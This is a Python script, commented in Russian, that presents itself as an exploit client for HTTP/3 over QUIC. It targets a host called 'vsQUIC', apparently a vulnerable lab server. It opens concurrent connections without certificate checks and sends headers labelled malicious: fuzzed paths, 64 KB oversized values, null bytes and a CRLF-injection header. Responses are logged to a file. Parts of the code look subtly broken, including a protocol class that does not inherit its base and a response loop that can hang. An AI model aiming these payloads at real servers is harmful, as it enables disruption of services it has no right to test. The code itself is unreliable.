import asyncio
import random
from datetime import datetime
from aioquic.quic.configuration import QuicConfiguration
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import HeadersReceived, DataReceived

def generate_fuzz_payload(length=100):
    chars = list(range(0x20, 0x7F)) + [0x00, 0x0A, 0x0D]  # ASCII + Null, LF, CR
    return bytes(random.choice(chars) for _ in range(length))

class QuicExploitClientProtocol:
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._http = H3Connection(self._quic)

class QuicExploitClient:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.configuration = QuicConfiguration(
            is_client=True,
            alpn_protocols=H3_ALPN,
            verify_mode=0,  # Отключаем проверку сертификата
        )

    async def send_exploit_payload(self, iteration: int):
        try:
            # Устанавливаем соединение с использованием нашего протокола
            async with connect(
                host=self.host,
                port=self.port,
                configuration=self.configuration,
                create_protocol=QuicExploitClientProtocol,
            ) as protocol:
                connection = protocol._http
                
                # Формируем вредоносные заголовки
                headers = [
                    (b":method", b"GET"),
                    (b":path", b"/?" + generate_fuzz_payload(50)),
                    (b"x-long-header", b"A" * 1024),                 # 1 KB
                    (b"x-huge-header", b"A" * 65536),                # 64 KB (макс. размер для некоторых серверов)
                    (b"x-null-header", b"\x00" * 100),               # Null-байты
                    (b"user-agent", b"Mozilla/5.0 (Exploit)"),
                    (b"x-overflow", b"A" * 65536),
                    (b"x-crlf", b"test\r\nInjected: header"),        # CRLF-инъекция
                ]

                # Отправляем запрос
                stream_id = connection.send_headers(
                    headers=headers,
                    end_stream=False
                )
                connection.send_data(stream_id=stream_id, data=b"PAYLOAD", end_stream=True)

                # Получаем ответ
                response = await self.receive_response(connection, stream_id)
                self.analyze_response(response, iteration)

        except Exception as e:
            print(f"[{iteration}] ❌ Error: {str(e)}")

    async def receive_response(self, h3_connection, stream_id):
        response = b""
        while True:
            event = h3_connection.next_event()
            if event is None:
                await asyncio.sleep(0.1)
                continue
            if isinstance(event, DataReceived) and event.stream_id == stream_id:
                response += event.data
                if event.stream_ended:
                    break
        return response

    def analyze_response(self, response: bytes, iteration: int):
        # Анализируем ответ сервера
        if response:
            print(f"[{iteration}] ✅ Response received ({len(response)} bytes)")
            # Логирование ответа
            with open("/opt/haCker_client_log.txt", "a") as f:
                f.write(f"[{datetime.now()}] Response: {response[:200]}...\n")
        else:
            print(f"[{iteration}] ❌ No response received")

    async def run_exploit(self, threads=100):
        tasks = [asyncio.create_task(self.send_exploit_payload(i)) for i in range(threads)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    print("Implementation QUIC Exploit Client - Отправка вредоносной нагрузки")
    print("Цель: vulnerable server QUIC aka 'vsQUIC'")
    
    client = QuicExploitClient("vsQUIC", 4433)
    asyncio.run(client.run_exploit(threads=10))